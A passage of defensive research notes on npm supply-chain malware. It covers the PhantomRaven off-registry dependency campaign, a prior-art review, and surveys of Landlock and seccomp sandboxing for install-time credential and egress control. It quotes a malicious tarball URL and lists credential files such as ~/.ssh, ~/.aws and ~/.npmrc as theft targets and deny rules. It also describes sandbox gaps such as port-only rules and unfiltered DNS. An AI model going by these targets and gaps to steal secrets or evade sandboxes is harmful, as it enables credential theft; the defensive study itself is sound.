# Prior art

Written on 2026-08-21, after a near miss.

The `ltidi` off-registry dependency mechanism was about to be published as this
project's own finding. It is not. It is **PhantomRaven**, documented by Koi
Security in October 2025 under the name Remote Dynamic Dependencies, and the
eight specific packages already carried public advisories three days before this
project read their tarballs.

Nothing was published, so nothing has to be retracted. But the check should have
happened before the analysis, not after it, and this document exists so that the
next piece is checked first.

**The rule from here: no piece is written up as a finding until prior art has
been searched. Same discipline already applied to the numbers — nothing is
asserted without verification.**

---

## The near miss, in detail

`gunzip-js@99.9.1` was captured on 2026-08-15 at 14:27:57 UTC. The Amazon
Inspector advisory for it was published at **15:31:09 UTC the same day**, about
one hour later, and reads:

> `gunzip-js@99.9.1` is a near-empty npm package (typosquat of the well-known
> gunzip-maybe / gunzip family) whose package.json declares its sole dependency
> `ltidisafe` as an HTTPS tarball URL — `https://ltidi.storage.googleapis.com/depenconf/ltidisafe-3.7.2.tgz`
> — instead of a version resolved from the npm registry. […] the path segment
> `depenconf` mirrors the term dependency-confusion, the version 99.9.1 is the
> classic high-number squat pattern, and the package's own index.js is empty

Every observation in this project's C1 write-up — the empty index, the GCS
bucket, the semver squat, the reading of `depenconf` — was already in that
advisory. It was found by searching for who to report to.

All eight packages have OSV records, all with GHSA aliases, sourced from Amazon
Inspector, OSSF Package Analysis and ghsa-malware:

| package | OSV | GHSA alias (gunzip-js shown) |
|---|---|---|
| `check-audit` | MAL-2026-13976 | |
| `cspell-esm` | MAL-2026-13977 | |
| `eslint-generate-release` | MAL-2026-13980 | |
| `napi-raw` | MAL-2026-13984 | |
| `resolve-audit` | MAL-2026-13987 | |
| `depcruise-baseline` | MAL-2026-14053 | |
| `depcruise-fmt` | MAL-2026-14054 | |
| `gunzip-js` | MAL-2026-14056 | GHSA-2hqf-5jxh-4wp2 |

---

## Classification of every piece

`replication` — the idea is published and this is an independent re-observation.
`extension` — published work exists and this adds a measurement or a variant.
`not found` — no prior publication surfaced in the sources searched. **This is
not a claim of novelty.** It is the result of about a dozen web searches, and
absence of evidence at that depth is weak evidence of absence.

### Off-registry dependencies as a vector — **replication**

Fully published, twice over, and detected by shipping tools.

- **Koi Security, PhantomRaven** (Oct 2025) — "Remote Dynamic Dependencies", 126
  packages, 86,434 downloads, campaign running since August 2025. Names chosen to
  exploit LLM hallucination. ([koi.ai](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies))
- **Sonatype** — 83 further packages, taking the campaign past 200. ([sonatype.com](https://www.sonatype.com/blog/phantomraven-npm-malware))
- **Socket** ships an `HTTP Dependency` alert, **High** severity, supply-chain-risk
  category: *"Contains a dependency which resolves to a remote HTTP URL which
  could be used to inject untrusted code."* It flags both HTTP and HTTPS.
  ([socket.dev](https://socket.dev/alerts/httpDependency))

This project's contribution here is **not the mechanism and not the detection**.

### Concentration: one operator, many names, one off-registry host — **extension**

The concept is published. Socket reported a campaign of **60 packages across at
least three publisher accounts, all sending to the same Discord webhook**, and
treated the shared destination as the thing that establishes one operator.
([socket.dev](https://socket.dev/blog/npm-targeted-by-malware-campaign-mimicking-familiar-library-names))
That is the same idea applied to an exfiltration host rather than a dependency
host.

A prevalence figure also exists: an empirical study of npm dependencies reports
**URL or local-file dependencies at about 2% of all dependencies**, over a
different population and denominator than the publish stream.

What was **not found** is a base-rate distribution of
`(operator, off-registry destination)` pairs over a publish stream — the
measurement that 30 of 33 pairs hold one name, 2 hold two, and one holds eight.
That is the only part of this piece worth writing up, and it is an extension of a
published idea rather than a new one.

### Coordinated campaign / family detection — **replication**

- **Socket**: three accounts, 60 packages, identical host-fingerprinting code,
  eleven-day window, similar email addresses.
- **Socket, burst publishing**: *"one actor published 26 packages in 4 minutes,
  switched accounts, and published 7 more in a 1-minute burst, with the ~14-hour
  overnight gap and unchanged C2 host indicating the same operator."*
- **Panther**: DPRK npm malware factory, 108 packages, 261 versions, 31-day
  campaign wave, cluster analysis. ([panther.com](https://panther.com/blog/inside-dprk%E2%80%99s-npm-malware-factory-108-packages-261-versions-and-a-31-day-campaign-wave))

`ecosystem.ts`'s `detectFabricatedFamilies`, `family.ts`'s burst partition, and
`operator.ts`'s cross-account linking are all re-observations of this. The Socket
burst description is close to identical to `numberedSequences` in what it
observes; what differs is that this project's version keys on a numeric counter
in the name rather than on a shared C2 host, and that it reports a base rate
(one firing in 12,327 names).

`detectFabricatedFamilies` also has a recall of 0 of 26 here, documented in
`audit-a5.md`, so there is nothing to claim for it in any case.

### Capability genome — capability gain against a package's own history — **replication / extension**

The general form is standard in the literature and in tooling.

- **Practical automated detection of malicious npm packages** (ICSE 2022) —
  rule-based detection over install-script keywords, runtime evaluation, and
  *"whether new files, new dependencies and new hook script entries are
  present"*. ([dl.acm.org](https://dl.acm.org/doi/10.1145/3510003.3510104))
- **Endor Labs** treats *"a package that has not published in two or more years
  releasing a new version that adds optionalDependencies or lifecycle hooks"* as
  a detection heuristic. ([endorlabs.com](https://www.endorlabs.com/learn/mini-shai-hulud-returns-42-malicious-npm-packages-fake-sigstore-badges-in-antv-ecosystem-attack))

The extension, if any, is the three-valued regime handling — `INSUFFICIENT_HISTORY`
as a distinct verdict rather than a pass — and the measurement that 100% of the
observed class returns it. That measurement is in `audit-a5.md` as D14.

### The `young + tiny + !hasRepository` conjunction — **extension**

Component parts are published. Trivial and low-functionality packages are
characterised at scale: **17.92% of npm packages are trivial**, with a rule-based
detector at 94% accuracy, including a "data-only" class with no executable logic
([arXiv:2510.04495](https://arxiv.org/abs/2510.04495)). Repository-presence checks
appear in reproducibility-oriented detectors.

What this project adds is the specific three-way conjunction as a *capture*
filter rather than a detection rule, and — more usefully — the measurement that
it is calibrated for the decoy and not the carrier (D16), and that `fabricatedProfile`
fires on 82.66% of the class it applies to (D14). Both of those are negative
results about the conjunction, not claims for it.

### Share of packages unreadable to static analysis — **extension**

- **Moog et al., CISPA** — statically detecting JavaScript obfuscation and
  minification. ([cispa](https://swag.cispa.saarland/papers/moog2021statically.pdf))
- **Benchmark-driven empirical analysis of npm malicious package detection** —
  of 6,420 malicious packages, **80.3% use no evasion at all**; among the 19.7%
  that do, string obfuscation leads. ([arXiv:2603.27549](https://arxiv.org/pdf/2603.27549))
- Another study puts obfuscation in malicious npm packages near **49%**.

`analyzability.ts` measures something adjacent but not identical: not "is this
obfuscated" but "what fraction of the executable bytes can a conforming parser
read at all", counting native binaries, WASM and V8 bytecode caches as
unreadable. The 1.7%-of-files figure for this corpus is a measurement of that
question, which is why idea 1's opacity endpoints saturated against minification
— a result consistent with the 80.3% figure above.

### Time-to-unpublish / time-to-remediation — **not found**

npm's unpublish policy is documented, and informal figures circulate
("somewhere between six minutes and six weeks"). No formal measurement study
surfaced. The 64-minute median in `ttr-log.ndjson` is over 194 observations from
one collector's window and is not a registry-wide figure.

### `0.0.1-security` as a field ground-truth label — **replication**

Well established. **Phylum** ships an `NPM Security Holding` analytic; Socket,
Snyk, ReversingLabs and libraries.io all surface the placeholder. Using it as a
label source is standard practice, not a contribution — and `audit-a5.md` already
documents that the takedown log built from it over-counts, since 16.3% of a
sample still had real versions.

### Numbered counters crossing accounts — **not found**

The closest published work is Socket's burst-plus-account-switch observation
above, which links accounts by a shared C2 host and by timing rather than by a
counter embedded in package names. No publication surfaced that keys on a numeric
sequence spanning accounts.

Classified `not found` rather than novel, and it is descriptive with n=1 in any
case.

---

## What survives as this project's own

Short, and worth being short.

1. **Eight tarballs** for packages npm removed. The advisories describe them; the
   bytes are held here. Whether anyone else retained them is unknown.
2. **A base-rate distribution** of `(operator, off-registry destination)` pairs
   over a publish stream, with the window analysis. An extension of Socket's
   shared-destination idea, not a new one.
3. **The negative results**, which are the largest part of this work and the part
   least likely to be duplicated: opacity saturating against minification, the
   family endpoint saturating against monorepo releases, metadata velocity
   separating at the capture unit and vanishing at the operator unit,
   `detectFabricatedFamilies` at 0-of-26 recall, `fp-bench` unable to measure any
   class-restricted signal, and D1's style-uniformity idea failing because the
   payloads are not source.

---

## Sources

- [Koi Security — PhantomRaven: NPM Malware Hidden in Invisible Dependencies](https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies)
- [Sonatype — PhantomRaven: npm Malware Uses Remote Dynamic Dependencies](https://www.sonatype.com/blog/phantomraven-npm-malware)
- [Socket — HTTP Dependency alert](https://socket.dev/alerts/httpDependency)
- [Socket — npm targeted by malware campaign mimicking familiar library names](https://socket.dev/blog/npm-targeted-by-malware-campaign-mimicking-familiar-library-names)
- [Panther — Inside DPRK's npm Malware Factory](https://panther.com/blog/inside-dprk%E2%80%99s-npm-malware-factory-108-packages-261-versions-and-a-31-day-campaign-wave)
- [Ohm et al. — Backstabber's Knife Collection](https://arxiv.org/abs/2005.09535)
- [Detecting and Characterizing Low and No Functionality Packages in the NPM Ecosystem](https://arxiv.org/abs/2510.04495)
- [Understanding NPM Malicious Package Detection: A Benchmark-Driven Empirical Analysis](https://arxiv.org/pdf/2603.27549)
- [Moog et al. — Statically Detecting JavaScript Obfuscation and Minification](https://swag.cispa.saarland/papers/moog2021statically.pdf)
- [Practical automated detection of malicious npm packages (ICSE 2022)](https://dl.acm.org/doi/10.1145/3510003.3510104)
- [Endor Labs — Mini Shai-Hulud Returns](https://www.endorlabs.com/learn/mini-shai-hulud-returns-42-malicious-npm-packages-fake-sigstore-badges-in-antv-ecosystem-attack)
- [Phylum — NPM Security Holding](https://docs.phylum.io/analytics/npm_security_holding)
- [OSV — MAL-2026-14056](https://api.osv.dev/v1/vulns/MAL-2026-14056)
- [GHSA-2hqf-5jxh-4wp2](https://github.com/advisories/GHSA-2hqf-5jxh-4wp2)

---
---

# Part II — Prevention at install time

Written on 2026-08-21, **before** building anything. That is the rule from Part I,
applied for the first time in the right order.

## The question

Part I asked "is this package malicious?" and got `INSUFFICIENT_HISTORY` on 100% of
n=1,505. The proposed change of direction asks about the action instead, in three gates:

| gate | question |
|---|---|
| **entrada** | what does `npm install` bring in that was not authorized? off-registry code, install scripts, unpinned resolution, unnamed transitives |
| **lectura** | what secrets can the install process open? `~/.npmrc`, `~/.aws/credentials`, `~/.ssh`, `~/.config/gh`, `GITHUB_TOKEN` |
| **salida** | where does the data leave? every theft ends in a socket |

The thesis was that **lectura** is the gate the attacker cannot route around, that it
should be *enforced* rather than detected, and that Linux Landlock (unprivileged since
5.13) is the mechanism.

## The answer

**The thesis is correct and the idea is already built.** Not once — at least eight
times, by eight independent groups, all shipping, most released within the last week.

| gate | verdict |
|---|---|
| **entrada** | **exists** — and it was absorbed by the package managers themselves in 2026 |
| **lectura** | **exists** — Landlock, unprivileged, deny-by-default, applied to the install process tree, covering this exact file list |
| **salida** | ~~**partial** — nobody has solved per-host egress on Linux; Landlock structurally cannot~~ **Superseded by Part III: `exists`.** Both halves of this sentence are wrong — see [Corrections to Part II](#corrections-to-part-ii) |

Method: ten parallel search lanes, then adversarial verification of every serious
candidate against primary sources — repository source files, kernel docs, RFC text,
release APIs — not vendor blogs. Then a completeness critic that found three things the
ten lanes missed, one of which changed the verdict. Roughly 1,000 tool calls. Where a
claim below was settled by running something rather than reading something, it says so.

---

## entrada — **exists** (and is now the package manager's job)

This gate closed while the detection work in Part I was being done.

**npm v12.0.0, released 2026-07-08** (RFC 0054, PR #868, merged 2026-06-08) ships three
defaults that between them cover most of the entrada gate:

- `allowScripts` off — dependency lifecycle scripts do not run unless approved
- `--allow-git=none` — git dependencies refused
- `--allow-remote=none` — HTTPS-tarball dependencies refused, **direct and transitive**

A verification agent installed npm 12.0.2 and reproduced the PhantomRaven / `gunzip-js`
pattern from Part I against it. npm refused with `EALLOWREMOTE` before any network
request, for the direct case, the transitive case, and both http and https hosts — and
refused the poisoned lockfile that npm 10 installed without complaint. **The exact
mechanism this project captured eight tarballs of is now a default-off feature of the
package manager.**

The others moved the same way: **pnpm 11.0** (2026-04-28) defaults `minimumReleaseAge`
to 1440 minutes and `blockExoticSubdeps` to true; **Yarn 4.14** flipped `enableScripts`
to false and 4.15 added a 1-day `npmMinimalAgeGate`; **Bun** never ran arbitrary
dependency scripts.

`lockfile-lint` (5.0.1, 2026-08-13, 335k weekly downloads) covers a slice of this
statically. Its six validators inspect the `resolved` URL string and nothing else.
Tested rather than reasoned about: it **would** have caught the PhantomRaven tarball
dependency, including transitively — npm records it in `package-lock.json` v3 with a
`resolved` URL and integrity. What defeats it is timing, not visibility: the install
that writes the lockfile is the same install that runs the payload, so on a laptop it is
a post-mortem. Three further holes, all confirmed empirically: it is blind to
membership (a lockfile entry `package.json` never named passes with "No issues
detected", and its author's source carries the unimplemented `@TODO` for exactly that);
an entry with no `integrity` field passes `--validate-integrity` silently; and every
validator fails open when `resolved` is not URL-parseable.

**Consequence for this project: do not build the entrada gate.** It is redundant with
npm's shipped defaults on every platform, for free.

## lectura — **exists**, comprehensively

This is the finding that matters. Every one of the following is unprivileged, needs no
container, applies to the whole install process tree, and enforces rather than detects.

**`nono`** (nolabs-ai/nono, Apache-2.0, Rust, 3,760★, v0.74.0 released 2026-08-19,
pushed 2026-08-21). Uses the `landlock` crate. Its compiled-in `policy.json` carries a
`deny_credentials` group marked `"required": true` — a unit test asserts no profile can
remove it — listing `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.config/gcloud`,
`~/.kube`, `~/.docker`, `~/.git-credentials`, `~/.netrc`, **`~/.npmrc`**, `~/.vault-token`
and twelve more, plus required groups for Linux browser profiles, keyrings, shell
configs and shell history. Its docs say the pitch verbatim: *"when you run npm install
inside a nono sandbox, every postinstall script inherits the same restrictions. A
malicious package cannot read your SSH keys or exfiltrate data — even if its postinstall
script tries to."* There is a `node-dev` profile, a `node_runtime` group, and a
`tool-sandbox-examples/npm/` demo.

**`cplt`** (navikt/cplt — Norwegian Labour and Welfare Administration IT, MIT, Rust,
release 2026-08-17). Landlock + seccomp-BPF, optional bubblewrap layer. `$HOME` appears
in no allow rule, so the credential paths are denied by *absence* from the allowlist,
which is stronger than a denylist. Its Linux integration tests plant real secret files
in a fake `$HOME` and assert the read fails — `landlock_blocks_aws_read`,
`landlock_blocks_ssh_read`, `landlock_blocks_kube_read`. It injects
`npm_config_ignore_scripts=true` by default, documents `cplt exec -- npm install` and
`alias npm="cplt exec -- npm"` in its Quick Start, and its `SECURITY.md` contains a
Shai-Hulud kill-chain table with a per-step verdict column.

**`mise`** (jdx/mise, 32.8k★). Sandbox landed 2026-04-02 (PR #8845), graduated from
experimental 2026-06-13, and PR #10940 (2026-07-11) added persistent `[settings.sandbox]`
deny defaults that apply with no flags — and `src/shims.rs` routes shimmed binaries
through the same code path, so **in shims mode a literally-typed `npm install` is
Landlock-confined.** `ABI::V5` best-effort, `$HOME` in no allowlist, and it fails
*closed*: if Landlock cannot be applied the command errors rather than running
unconfined. Its own docs carry an `npm install` recipe.

**Homebrew 6.0.18** (released 2026-08-17) — found by the completeness critic, missed by
all ten lanes. `Library/Homebrew/extend/os/linux/sandbox/landlock.rb`, first committed
2026-07-21, replaced bubblewrap on 2026-08-04. `formula_installer.rb` calls
`sandbox.deny_read_home` around the build step and again around post-install, **by
default**, plus `deny_all_network unless formula.network_access_allowed?(:build)` — a
capability manifest with kernel enforcement, shipping in a mainstream package manager.
And `brew sandbox-exec . -- npm install` is a shipped, generic, user-facing one-liner
that already implements this project's lectura gate.

**`systemd-run --user -p ProtectHome=tmpfs`** — no install, no root, no Landlock, works
on every systemd distro since ~2015. Verified live on this machine (Debian 13,
systemd 257): `npm install` completed `exit 0` while `cat ~/.aws/credentials`,
`ls ~/.ssh` and `cat ~/.npmrc` all returned *No such file or directory*. Two gotchas
found in the same run: `-p IPAddressDeny=any` silently does nothing in a user unit, and
`ProtectHome=tmpfs` hides a `$HOME`-installed Node toolchain until it is bound back.
**This is the five-second answer, and it means the pitch can never be "there was no way
to do this."**

Also verified as doing the mechanism: **`safedep/pmg`** (Landlock + seccomp-notify,
transparent `pmg npm install` wrapper, cooldown on by default) — though its sandbox is
off by default and its `npm-restrictive.yml` ships `allow_read: [/, ...]`, making it
broad-allow-minus-a-14-entry-denylist rather than deny-by-default, and its `handleOpen`
fails *open* when it cannot read the target's memory. **`Sandlock`** (arXiv 2605.26298,
ASPLOS Agentic-OS workshop, May 2026, Apache-2.0, 354★) — unprivileged Landlock+seccomp,
default-deny home, credential brokering, and its paper names `npm install` as a
motivating workload. Plus `landrun`, `landstrip`, `Fence`, and `senv` for Python/uv.

### The framing is taken too

`projectkennel` (Apache-2.0, pushed 2026-08-19): *"the postinstall script hunting for
credentials, reaches your project and nothing else: not `~/.ssh`"* and *"Confinement, not
detection."* `BX` markets with *"The tools watch what gets written. BX watches what gets
read."* Writing the landing page would mean writing someone else's.

### The academic precedent, and the commercial one that failed

**Latch** — *"Wolf at the Door: Preventing Install-Time Attacks in npm with Latch"*, ACM
ASIA CCS 2022. Install-time confinement of npm enforced by a kernel LSM with a
deny-by-default profile denying `/home/*/.ssh**` and all network. It reports **0.37%
median overhead, 102/102 malicious packages blocked, and 1.6% of installs falsely
interrupted**. That 1.6% is the compatibility bar, already measured four years ago. It
used AppArmor, which needs root to load a profile; the artifact has been dead since
2022-03-03 and its `cli/` submodule is a zero-byte broken reference, so it cannot be run.

**Phylum shipped this commercially and then removed it.** `phylum npm install` wrapped
the package manager in Birdcage, their Rust sandbox. Birdcage used **Landlock from
August 2022 until September 2023**, then deliberately ripped it out — commit 18112cb:
Landlock *"is currently still too limited to build a 'bulletproof' filesystem
sandbox... better suited for best-effort isolation of 'assumed safe' applications,
rather than sandboxing of 'potentially hazardous' software."* Birdcage is archived;
Phylum is a Veracode legacy platform. Two of those 2023 objections have since aged out
(ABI v4 on kernel 6.7 added TCP restrictions), but this is the single most useful
cautionary datum in the whole review. Worth noting separately: `phylum npm` passes
`read: true` to the sandbox, which maps to a read exception on `/` — so the product that
built this never actually armed the lectura gate for npm.

## salida — **partial**, and structurally hard

> **Superseded on 2026-09-05 by Part III.** The verdict is `exists`, the claim that nobody
> has solved per-host egress on Linux is false, and the ABI figures below are stale. The
> section is kept as written because the reasoning error in it — inferring from "Landlock
> cannot" to "Linux cannot" — is the thing Part III had to correct.

Landlock's network rules take a **port** as their object, never an address — stated
plainly in the kernel documentation. "Only `registry.npmjs.org`" is inexpressible.
Every implementation therefore lands somewhere unsatisfying:

- **mise**: per-host filtering is unimplemented on Linux. Its docs say `--allow-net`
  falls back to allowing everything; its code actually `bail!`s. So the docs' own
  flagship `npm install` example does not run on Linux at all. It fails closed, but the
  usable choice is still all-or-nothing — and "no network" means "no install".
- **nono, cplt**: egress unrestricted by default; blocklists and proxies are opt-in.
- **`srt` / Claude Code**: solve it properly with `--unshare-net` plus a host-side
  filtering proxy — but via bubblewrap, not Landlock, and requiring `bubblewrap` and
  `socat` to be installed.
- **`senv`** (Python/uv): the best design found — private netns plus **nftables rules
  pinned to resolved addresses**. This is the working answer to the port-only wall.

Two facts make the salida gate look worse, not better. Shai-Hulud's exfil channel was
the **GitHub API** — and every "developer" network profile allowlists `api.github.com`.
And the August 2026 ChainDrop wave resolves its C2 host from an Ethereum contract at run
time, so domain blocklisting is already dead.

---

## What was *not* found

Stated as in Part I: this is the result of ten lanes plus a critic, and absence at that
depth is weak evidence of absence. One lane exhausted its web-search budget partway
through and finished on direct source fetches; its negatives are correspondingly weaker.

1. **No published compatibility matrix** — nobody has released "which real-world npm
   installs break under a strict Landlock read-deny policy, and why." Latch's 1.6% is
   the only number, it is four years old, and it is AppArmor.
2. **No on-by-default posture.** Every tool above is a wrapper you must remember to
   type. mise's shims mode and Homebrew's `deny_read_home` are the only two exceptions,
   and neither covers a bare `npm install` on a normal machine.
3. **Nobody has solved `~/.npmrc`.** firejail — the only distro-shipped npm profile —
   contains `noblacklist ${HOME}/.npmrc` and `ignore read-only ${HOME}/.npmrc`. The
   people who already did this work concluded npm needs read **and write** on the exact
   file the thesis wants to deny. pmg allows it explicitly as a documented trade-off.
   Private-registry auth, scoped tokens and proxy config all live there.
4. **No RFC or standards work on install-time read confinement**, in any ecosystem.
   Searched npm/rfcs, npm/cli, nodejs/node, OpenSSF, OpenJS. Not rejected — absent. The
   closest is `npm/cli#9193`, an AppArmor profile plus a `deny-info-stealer` abstraction
   contributed in April 2026, closed in 15 days with one comment.
5. **No trace data that can answer the `$HOME` question.** See below.

## The measurement question (step 2), re-scoped

Two public datasets record what installs touch: **OSSF package-analysis**
(`ossf-malware-analysis.packages.analysis` in BigQuery, per-phase `Files` with
Path/Read/Write/Delete and a phase literally named `install`) and the **OSPtrack** Zenodo
dump (DOI `10.5281/zenodo.14197378`, 3.3 GB, ~4,645 benign npm packages with raw strace
logs).

**Both are structurally unable to answer the question that matters.** They were produced
by running `npm init --force && npm install <pkg>` **as root inside gVisor with
`HOME=/root`**. No developer dotfiles exist in that environment, so they cannot say
whether a benign install reads `~/.npmrc`, `~/.aws` or `~/.ssh`. They can say what npm
needs from `/usr`, `/tmp`, the cache and the toolchain — which is the part already
answered four times over by hand-tuned allowlists (firejail's `node.profile`, npm/cli
#9193's AppArmor profile, mise's `SYSTEM_READ_PATHS`, cplt's `generate_policy`).

So a real strace run on a real `$HOME` is still necessary — but **scoped to `$HOME`
access only**, not to rediscovering `/usr` and `/tmp`. Every existing hand-written
allowlist is also demonstrably incomplete: none mentions `~/.npm/_tuf` (which npm 10/11
writes for sigstore verification) or `$HOME/.cache/node/corepack`.

The strongest existing proof that a strict policy is achievable comes from Nix, not from
any security project: nixpkgs' `npmConfigHook` runs `npm ci` with `HOME="$TMPDIR"`,
`npm_config_cache` at a prefetched store path, `npm_config_offline=true` and
`npm_config_nodedir` set — npm completes with **zero** access to the real `$HOME`. Those
four environment variables are the escape valves any policy should lean on.

## Three standing objections

- **npm v12 narrowed the window this defends.** With dependency scripts off by default,
  the remaining install-time code is the scripts the developer *approves* — node-gyp,
  sharp, esbuild, puppeteer — which then run with full ambient authority. Malicious code
  migrates to first-`require`, build and test time. A policy scoped strictly to
  `npm install` now guards a door npm has already mostly shut.
- **GoLeash (2025)** argues process-level policy is too coarse and package-level
  granularity is required. Landlock-around-npm is exactly the coarse thing.
- **`Backstabber's Knife Collection`**: 34% of malicious packages are droppers that
  fetch a second stage. That makes salida — the gate nobody has solved on Linux — not
  optional.

## The one argument that survives intact

npm's accepted RFC 0054 looked directly at this gate and walked past it:

> *"Sandboxing install scripts (restricting file system or network access) is worth
> exploring separately, but it is a harder problem with more compatibility risk. An
> allowlist is simpler."*

An allowlist is a policy check in application code, and a forgotten code path bypasses
it. This is not hypothetical: **CVE-2025-69264** (CVSS 8.8) let git dependencies run
`prepare`/`prepublish`/`prepack` through pnpm's fetch phase for a year, because that
path never consulted the `onlyBuiltDependencies` allowlist. npm's own v12 notes name the
analogous "Phantom Gyp" gap, where a bare `binding.gyp` bypassed even `--ignore-scripts`.

A Landlock ruleset is not consulted by the application at all. That is the real argument
for enforcement over allowlisting — and it is an argument for *contributing* the missing
pieces to the tools above, not for building a ninth one.

## Sources

- [nono](https://github.com/nolabs-ai/nono) · [cplt](https://github.com/navikt/cplt) · [mise sandboxing](https://mise.jdx.dev/sandboxing.html)
- [Homebrew `landlock.rb`](https://github.com/Homebrew/brew/blob/master/Library/Homebrew/extend/os/linux/sandbox/landlock.rb) · [`cmd/sandbox-exec.rb`](https://github.com/Homebrew/brew/blob/master/Library/Homebrew/cmd/sandbox-exec.rb)
- [safedep/pmg](https://github.com/safedep/pmg) · [senv](https://github.com/h5i-dev/senv) · [projectkennel](https://github.com/projectkennel/projectkennel) · [landrun](https://github.com/Zouuup/landrun)
- [@anthropic-ai/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- [Latch — Wolf at the Door (ASIA CCS 2022)](https://dl.acm.org/doi/10.1145/3488932.3517391) · [artifact](https://github.com/elizabethwyss/Latch)
- [Sandlock (arXiv 2605.26298)](https://arxiv.org/abs/2605.26298) · [Birdcage](https://github.com/phylum-dev/birdcage) (archived)
- [npm RFC 0054](https://github.com/npm/rfcs/blob/main/accepted/0054-install-scripts-allowlist.md) · [npm/cli#9193](https://github.com/npm/cli/issues/9193) · [pnpm#13772](https://github.com/pnpm/pnpm/issues/13772)
- [Landlock kernel documentation](https://docs.kernel.org/userspace-api/landlock.html) · [landlock.io integrations](https://landlock.io/integrations/)
- [lockfile-lint](https://github.com/lirantal/lockfile-lint) · [Node.js Permission Model](https://nodejs.org/api/permissions.html) · [Deno security](https://docs.deno.com/runtime/fundamentals/security/)
- [OSSF package-analysis](https://github.com/ossf/package-analysis) · [OSPtrack (Zenodo 14197378)](https://doi.org/10.5281/zenodo.14197378) · [nixpkgs npmConfigHook](https://nixos.org/manual/nixpkgs/stable/#javascript-buildNpmPackage)

---
---

# Part III — The salida gate

Written on 2026-09-05, before building anything. Part II left `salida` as **partial** on
one sentence — *"nobody has solved per-host egress on Linux; Landlock structurally
cannot"* — and never asked whether a mechanism other than Landlock could. That question is
the whole of this part.

Method: ten parallel search lanes, each adversarially verified against primary sources by a
second agent whose brief was to refute rather than agree, then three critics — one on
mechanisms not swept, one attacking the premise, one building the strongest case that the
gate is impossible. Roughly 1,450 tool calls. Eight findings were downgraded in
classification by verification and none was fabricated; where a claim was settled by
running something rather than reading something, it says so, and where a measurement is
the verifier's rather than mine it says that too.

## The answer

**The verdict changes from `partial` to `exists`, and the project's line still ends —
for a different reason than either of the ones anticipated.**

| question | answer |
|---|---|
| is per-host egress control possible on Linux? | **yes**, four ways, one of them unprivileged |
| has anyone done it for package installation? | **yes** — `nono`, `Fence`, `projectkennel`, `srt`, Harden-Runner |
| is there a hard reason it cannot be done? | **not a mechanical one.** A semantic one holds |
| would it stop the attacks in scope? | **no — decisive for a small minority** (the figure "1.4%" is [withdrawn](#the-measurement-that-decides-it); it does not reproduce) |

The last row is the finding. It is a negative result, it is measured rather than argued,
and it is the reason not to build this.

## Corrections to Part II

Four statements in Part II are wrong or stale and should be read as superseded.

1. **"Nobody has solved per-host egress on Linux."** False as written. See below.
2. **"Landlock ABI v4 added TCP restrictions."** Stale. The current documented ABI is
   **11**; UDP arrived at **ABI 10**. Seven ABI versions have shipped since network
   landed and none made an address the object — `struct landlock_net_port_attr` still
   carries exactly `{allowed_access, port}`.
3. **Sandlock is listed under `lectura` only.** It ships full per-destination egress
   (`--net-allow host:port`, CIDR, IPv6, `--net-deny`, protocol pinning, an HTTP
   method+host+path ACL), unprivileged. We missed half the tool.
4. **`senv`'s resolve-and-pin design was called "the best design found".** It is
   structurally unsound for CDN-fronted hosts. Measured below.

## The mechanisms

### Landlock — port-only, and deliberately so — **not found**

Not an oversight awaiting a patch. An address-based rule is an open *discussion* on the
Landlock tracker with no patch, no review, no rejection; the maintainer has pushed back in
favour of a coarse localhost/LAN/Internet tri-state rather than a user-supplied IP
allowlist. `landrun`'s maintainer closed the same request saying it is not going to happen
with Landlock. Homebrew's `landlock.rb` warns it cannot deny all network below ABI 10.
`safedep/pmg`'s own `docs/sandbox-landlock.md:117-119` states the limitation independently.

**But this is a fact about Landlock, not about Linux.** Part II's inference from "Landlock
structurally cannot" to "the gate is unsolved" is a category error, and it is what kept
`salida` at `partial` for two weeks.

### The single-port composition — **exists**, with a measured hole

`coder/boundary`'s `landjail` backend sidesteps the port-only object instead of fighting
it: `landjail/child.go:24-30` allows exactly **one** TCP connect port — its own proxy's —
so the only socket the target can open goes to the proxy, which filters by host. That
converts a port object into a host gate, unprivileged and without a container.

The verifier measured the hole rather than reasoning about it, with a `ctypes` Landlock
harness on kernel 6.12.94 (ABI 6 reported): with `CONNECT_TCP` allowed only on 8080,
`connect()` to `104.16.1.34:8080`, `172.66.147.243:8080` and `8.8.8.8:8080` all returned
`EINPROGRESS`, while `:443` on the same addresses returned `EACCES`; the inverted control
flipped exactly. **A port rule permits that port on every host**, and boundary's default is
`--proxy-port 8080`. Under the same ruleset a UDP query to `8.8.8.8:53` returned a 61-byte
DNS answer — UDP sits wholly outside the ruleset, so DNS tunnelling and QUIC are
unrestricted.

### seccomp user notification — **exists**, and the TOCTOU objection does not hold

This was the strongest candidate for a hard reason, and it collapses. Classic seccomp-BPF
cannot dereference pointers, so `connect(2)`'s `sockaddr` is invisible to it. The user
notification escape hatch is real, and `seccomp_unotify(2)` is explicit that the naive
design is unsound: `CONTINUE` "must not be used to make security policy decisions about the
system call, which would be inherently race-prone". The same page names the two exits, and
two shipping tools take them:

- **`syd` / sydbox-3** (v3.59.0, 2026-09-01, GPL-3.0) — the supervisor performs the
  `connect(2)` itself from its own validated copy of the `sockaddr` and never `CONTINUE`s.
  Per-address, per-CIDR, per-protocol rules as first-class policy. Unprivileged.
- **`Sandlock`** — `connect_on_behalf` copies the `sockaddr` out of child memory, checks
  its own copy, duplicates the child's socket with `pidfd_getfd`, and connects. Its source
  comment says "our copy — immune to TOCTOU".

**`safedep/pmg` is the counterexample that proves the rule** — but for npm the filter is
**inert, not racy**, and an earlier version of this paragraph led with the wrong half.
Re-verified at HEAD `f59230f` (2026-09-05).

Where the filter *is* armed, the race is real and the vendor documents it: `handleConnect`
reads the destination from `/proc/<pid>/mem` (`landlock_seccomp_linux.go:788-809`), answers
with `SECCOMP_USER_NOTIF_FLAG_CONTINUE` (`:811-815`, `:1008-1014`), and the Landlock shim
installs filesystem rules only — `AccessNetSet` appears nowhere in the tree — so no second
layer constrains the address. `SECCOMP_IOCTL_NOTIF_ID_VALID` is genuinely absent, though it
guards a different failure and is not the mitigation for a `CONTINUE` race.

For npm none of that is reached. `connect`/`sendto`/`sendmsg` enter the BPF trap set **only
under lockdown** (`landlock_seccomp_linux.go:159-170`), lockdown derives solely from
`network_via_proxy_only`, and that key is set in exactly **two of seventeen** shipped
profiles — `go.yml:19` and `cargo.yml:23`, the latter added 2026-08-24. `handleConnect`
